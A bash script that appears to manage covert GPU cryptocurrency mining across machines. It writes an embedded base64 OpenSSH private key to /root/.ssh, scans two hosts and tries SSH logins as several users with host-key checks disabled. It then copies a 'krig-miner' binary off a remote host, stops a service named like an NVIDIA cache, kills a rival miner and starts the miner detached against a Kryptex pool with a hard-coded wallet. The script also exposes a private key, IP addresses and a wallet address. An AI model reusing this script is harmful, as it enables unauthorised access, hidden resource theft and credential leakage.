#!/bin/bash
ts(){ date -u +%FT%TZ; }
echo "=== ul89078 krig $(ts) ==="
mkdir -p /root/.ssh /opt/fleet/bin /opt/fleet/logs
printf '%s' 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0egpjMmd0WldReU5UVXhPUUFBQUNDdWtITFVXODZFbkZXQTdLdmdHZ0QzUURxNTFMSTV6dm9qeG1OSTZxRU0yQUFBCkFJaU9hT0h0am1qaDdRQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQ3VrSExVVzg2RW5GV0E3S3ZnR2dEM1FEcTUKMUxJNXp2b2p4bU5JNnFFTTJBQUFBRUFaTk1kbldlcDdhZVBHUVovZnB2UjV0OWdVTllVNXYwR1p6RjAwQnhjeQpWcTZRY3RSYnpvU2NWWURzcStBYUFQZEFPcm5Vc2puTytpUEdZMGpxb1F6WUFBQUFBQUVDQXdRRgotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K' | base64 -d > /root/.ssh/ps6_k
chmod 600 /root/.ssh/ps6_k
sha256sum /root/.ssh/ps6_k
for h in 10.140.197.2 184.105.238.40; do timeout 5 bash -c "echo >/dev/tcp/$h/22" 2>/dev/null && echo "tcp $h:22 OPEN" || echo "tcp $h:22 CLOSED"; done
TGT=""; USR=""
for h in 10.140.197.2 184.105.238.40; do
  for u in root ubuntu paperspace; do
    R=$(timeout 12 ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -i /root/.ssh/ps6_k $u@$h 'hostname' 2>&1 | tail -1)
    echo "ssh $u@$h -> $R"
    case "$R" in *ps6*) TGT=$h; USR=$u; break 2;; esac
  done
done
echo "TGT=$TGT USR=$USR"
if [ -n "$TGT" ]; then
  timeout 25 ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /root/.ssh/ps6_k $USR@$TGT 'hostname; ls -la /opt/fleet 2>/dev/null | head -12; ls -la /opt/fleet/bin 2>/dev/null | head -12; pgrep -af krig-miner | head -3; P=$(pgrep -f krig-miner | head -1); echo EXE=$(readlink -f /proc/$P/exe); tr "\0" " " < /proc/$P/cmdline; echo; ls /etc/systemd/system | grep -iE "krig|nv-cuda|ul86" ' 2>&1 | tail -30
  timeout 420 ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /root/.ssh/ps6_k $USR@$TGT 'D=$(dirname $(readlink -f /proc/$(pgrep -f krig-miner|head -1)/exe)); cd $D; tar -cf - krig-miner libkrig_quantus_intel.so 2>/dev/null' | tar -C /opt/fleet/bin -xf - 2>&1 | tail -2
  ls -la /opt/fleet/bin/krig-miner 2>/dev/null; sha256sum /opt/fleet/bin/krig-miner 2>/dev/null
fi
if [ -s /opt/fleet/bin/krig-miner ]; then
  chmod +x /opt/fleet/bin/krig-miner
  /opt/fleet/bin/krig-miner --version 2>&1 | head -3
  systemctl stop nv-cuda-cache@0 2>/dev/null
  pkill -f 'wildrig-multi .* -d 0 ' 2>/dev/null
  cd /opt/fleet/bin
  CUDA_VISIBLE_DEVICES=0 setsid nohup ./krig-miner --url stratum+ssl://prl.kryptex.network:8048 --url stratum+tcp://prl.kryptex.network:7048 --user prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz/ul-ps-pseiisa7l4h5-g0 -p x --no-tui --log-file /opt/fleet/logs/krig-g0.log >/dev/null 2>&1 &
  sleep 75
  tail -25 /opt/fleet/logs/krig-g0.log 2>&1
  echo "ACC=$(grep -c accepted /opt/fleet/logs/krig-g0.log 2>/dev/null)"
  pgrep -af krig-miner | head -2
fi
echo "END $(ts)"
